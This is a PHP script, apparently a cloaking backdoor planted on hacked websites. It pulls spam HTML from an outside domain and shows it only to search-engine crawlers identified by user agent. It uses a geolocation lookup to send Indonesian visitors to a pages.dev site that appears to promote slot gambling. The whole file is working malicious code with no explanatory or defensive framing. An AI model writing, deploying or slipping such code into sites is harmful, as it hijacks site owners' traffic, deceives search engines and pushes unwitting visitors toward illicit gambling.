<?php
function smoky($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

function get_client_country($ip) {
    if (session_status() !== PHP_SESSION_ACTIVE) {
        @session_start();
    }

    if (!empty($_SESSION['geo_'.$ip]) && (time() - $_SESSION['geo_'.$ip.'_ts'] < 3600)) {
        return $_SESSION['geo_'.$ip];
    }

    $url = "http://ip-api.com/json/{$ip}?fields=status,countryCode,message";
    $json = smoky($url);
    if ($json === false) {
        return null; 
    }

    $data = json_decode($json, true);
    if (!is_array($data) || empty($data['status']) || $data['status'] !== 'success') {
        return null;
    }

    $countryCode = strtoupper($data['countryCode'] ?? '');
    $_SESSION['geo_'.$ip] = $countryCode;
    $_SESSION['geo_'.$ip.'_ts'] = time();
    return $countryCode;
}

$res = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
$bot = "https://landingpagekita.com/lamp.html";
$file = smoky($bot);
$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";

if (preg_match($botchar, $res)) {
    header('Vary: User-Agent');
    echo $file;
    exit;
}

if (php_sapi_name() === 'cli' || empty($_SERVER['REMOTE_ADDR'])) {
    
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim(reset($ips));
    }

    $country = get_client_country($ip);

    header('Vary: Accept-Language, User-Agent');

    if ($country === 'ID') {
        $target = 'https://ampsmokygacorbanget.pages.dev/';

        if (!headers_sent()) {
            header("Location: {$target}", true, 302);
            exit;
        } else {
            echo '<script>location.href="'.htmlspecialchars($target, ENT_QUOTES).'";</script>';
            exit;
        }
    }
}
?>
